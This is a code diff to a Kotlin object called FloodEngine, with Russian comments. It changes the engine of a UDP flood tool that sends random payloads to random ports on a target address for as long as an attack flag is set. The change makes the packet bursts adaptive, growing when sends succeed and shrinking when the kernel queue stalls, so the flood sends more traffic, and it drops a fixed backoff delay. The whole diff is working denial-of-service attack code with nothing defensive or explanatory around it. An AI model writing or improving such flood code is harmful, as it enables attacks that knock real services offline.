@@ -32,8 +32,9 @@ object FloodEngine {
             jobScope.launch {
                 val random = Random(System.nanoTime() + i)
                 var localCount = 0L
+                var burst = 3
+                var stallWindow = 0
 
-                // самовосстановление: поток живет до стопа, канал пересоздается при сбое
                 while (isAttacking && currentCoroutineContext().isActive) {
                     var channel: DatagramChannel? = null
                     try {
@@ -47,7 +48,7 @@ object FloodEngine {
                             val payload = ByteArray(len).apply { random.nextBytes(this) }
                             var stalled = false
 
-                            repeat(3) {
+                            repeat(burst) {
                                 val port = random.nextInt(1024, 65535)
                                 val sent = try {
                                     channel.send(ByteBuffer.wrap(payload), InetSocketAddress(address, port))
@@ -57,12 +58,24 @@ object FloodEngine {
                                 if (sent > 0) localCount++ else stalled = true
                             }
 
+                            // адаптация: чисто -> растем, затыки -> снижаемся
+                            if (stalled) {
+                                stallWindow++
+                                if (stallWindow > 4) {
+                                    burst = maxOf(1, burst - 1)
+                                    stallWindow = 0
+                                    delay(1)
+                                }
+                            } else if (stallWindow > 0) {
+                                stallWindow--
+                            } else if (burst < 6 && localCount % 5000L < burst.toLong()) {
+                                burst++
+                            }
+
                             if (localCount >= 1000) {
                                 packetCount.addAndGet(localCount)
                                 localCount = 0L
                             }
-                            // очередь ядра полна: отступаем, но не умираем
-                            if (stalled) delay(2)
                         }
                     } catch (e: Exception) {
                         delay(50)
